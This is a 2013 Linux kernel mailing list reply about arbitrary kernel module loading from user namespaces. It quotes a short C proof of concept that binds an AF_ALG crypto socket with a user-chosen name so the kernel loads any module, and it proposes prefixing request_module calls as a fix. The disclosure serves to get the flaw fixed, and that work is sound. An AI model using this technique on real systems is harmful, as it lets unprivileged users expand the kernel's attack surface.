Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1757648Ab3CDQqE (ORCPT <rfc822;w@1wt.eu>);
	Mon, 4 Mar 2013 11:46:04 -0500
Received: from mail-ob0-f180.google.com ([209.85.214.180]:61414 "EHLO
	mail-ob0-f180.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1756963Ab3CDQqB (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Mon, 4 Mar 2013 11:46:01 -0500
MIME-Version: 1.0
In-Reply-To: <20130304082959.GA22087@r00tworld.net>
References: <CAGXu5jK7x+gFKgCN5=ZF+kSc4xSNbGtSERHCoOnCEgiJ1_wNGg@mail.gmail.com>
	<20130303005700.GA32213@austin.hallyn.com>
	<CAGXu5jLciqXcuhzDVPKPqA+mwv8e28zGAMScatzov3U07BuBaQ@mail.gmail.com>
	<20130303035608.GA2703@austin.hallyn.com>
	<CAGXu5jKphNv9+wYE1GwfXKXDdzeWB_AtiqxT0e2PEzqCXNPkfQ@mail.gmail.com>
	<20130304082959.GA22087@r00tworld.net>
Date: Mon, 4 Mar 2013 08:46:01 -0800
Message-ID: <CAGXu5j+4quUZ3Lw7AiOSe1e0iewPCDSZZPXcp-KPahQy6cGjww@mail.gmail.com>
Subject: Re: user ns: arbitrary module loading
From: Kees Cook <keescook@google.com>
To: Mathias Krause <minipli@googlemail.com>
Cc: "Serge E. Hallyn" <serge@hallyn.com>,
        "Eric W. Biederman" <ebiederm@xmission.com>,
        LKML <linux-kernel@vger.kernel.org>,
        Serge Hallyn <serge.hallyn@canonical.com>,
        Brad Spengler <spender@grsecurity.net>,
        Al Viro <viro@zeniv.linux.org.uk>, Eric Paris <eparis@redhat.com>,
        Rusty Russell <rusty@rustcorp.com.au>, PaX Team <pageexec@freemail.hu>,
        Herbert Xu <herbert@gondor.hengli.com.au>,
        "David S. Miller" <davem@davemloft.net>
Content-Type: text/plain; charset=ISO-8859-1
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On Mon, Mar 4, 2013 at 12:29 AM, Mathias Krause <minipli@googlemail.com> wrote:
> On Sun, Mar 03, 2013 at 09:48:50AM -0800, Kees Cook wrote:
>> Several subsystems already have an implicit subsystem restriction
>> because they load with aliases. (e.g. binfmt-XXXX, net-pf=NNN,
>> snd-card-NNN, FOO-iosched, etc). This isn't the case for filesystems
>> and a few others, unfortunately:
>>
>> $ git grep 'request_module("%.*s"' | grep -vi prefix
>> crypto/api.c:           request_module("%s", name);
>>
>> [...]
>>
>> Several of these come from hardcoded values, though (e.g. crypto, chipreg).
>
> Well, crypto does not. Try the code snippet below on a system with
> CONFIG_CRYPTO_USER_API=y. It'll abuse the above request_module() call
> to load any module the user requests -- iregardless of being contained
> in a user ns or not.

Oh ew. Yeah, I must have missed the path through the user api. Arg.

> ---8<---
> /* Loading arbitrary modules using crypto api since v2.6.38
>  *
>  * - minipli
>  */
> #include <linux/if_alg.h>
> #include <sys/socket.h>
> #include <unistd.h>
> #include <stdlib.h>
> #include <string.h>
> #include <stdio.h>
>
> #ifndef AF_ALG
> #define AF_ALG 38
> #endif
>
>
> int main(int argc, char **argv) {
>         struct sockaddr_alg sa_alg = {
>                 .salg_family = AF_ALG,
>                 .salg_type = "hash",
>         };
>         int sock;
>
>         if (argc != 2) {
>                 printf("usage: %s MODULE_NAME\n", argv[0]);
>                 exit(1);
>         }
>
>         sock = socket(AF_ALG, SOCK_SEQPACKET, 0);
>         if (sock < 0) {
>                 perror("socket(AF_ALG)");
>                 exit(1);
>         }
>
>         strncpy((char *) sa_alg.salg_name, argv[1], sizeof(sa_alg.salg_name));
>         bind(sock, (struct sockaddr *) &sa_alg, sizeof(sa_alg));
>         close(sock);
>
>         return 0;
> }
> --->8---
>
> If people care about unprivileged users not being able to load arbitrary
> modules, could someone please fix this in crypto API, then? Herbert?

So, should this get a prefix too?  Maybe we need to change the
request_module primitive to request_module(prefix, fmt, args) to stop
these request_module("%s", name) things from continuing to exist...

-Kees

-- 
Kees Cook
Chrome OS Security
